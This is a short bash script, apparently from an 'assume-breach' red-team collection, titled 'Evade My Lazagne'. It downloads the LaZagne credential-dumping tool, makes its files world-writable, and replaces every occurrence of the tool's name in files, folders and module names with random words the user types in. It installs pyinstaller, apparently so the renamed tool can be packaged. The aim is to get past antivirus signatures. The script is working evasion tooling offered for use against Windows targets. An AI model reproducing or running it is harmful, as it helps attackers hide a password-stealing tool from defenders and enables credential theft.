#!/bin/bash
cat << "EOF"
  __ _ ___ ___ _   _ _ __ ___   ___      | |__  _ __ ___  __ _  ___| |__  
 / _` / __/ __| | | | '_ ` _ \ / _ \_____| '_ \| '__/ _ \/ _` |/ __| '_ \ 
| (_| \__ \__ \ |_| | | | | | |  __/_____| |_) | | |  __/ (_| | (__| | | |
 \__,_|___/___/\__,_|_| |_| |_|\___|     |_.__/|_|  \___|\__,_|\___|_| |_|
                           
			    **Evade My Lazagne**
                 
                            Use At Your Own Risk
                  
                   
 
EOF

pip install  pyinstaller 
apt install unzip -y

curl https://github.com/AlessandroZ/LaZagne/archive/refs/tags/2.4.3.zip -O -J -L
unzip LaZagne-2.4.3.zip
chmod -R 777 LaZagne-2.4.3

echo "Enter A Random Word"

read Random1

echo "Enter Another Random Word"

read Random2

echo "Last One"

read Random3

cd LaZagne-2.4.3/Windows/

find -type f -exec sed -i s/lazagne/$Random1/g {} +
find -type f -exec sed -i s/LaZagne/$Random2/g {} +
find -type f -exec sed -i s/laZagne/$Random3/g {} +

mv lazagne/ $Random1
mv laZagne.py $Random2.py
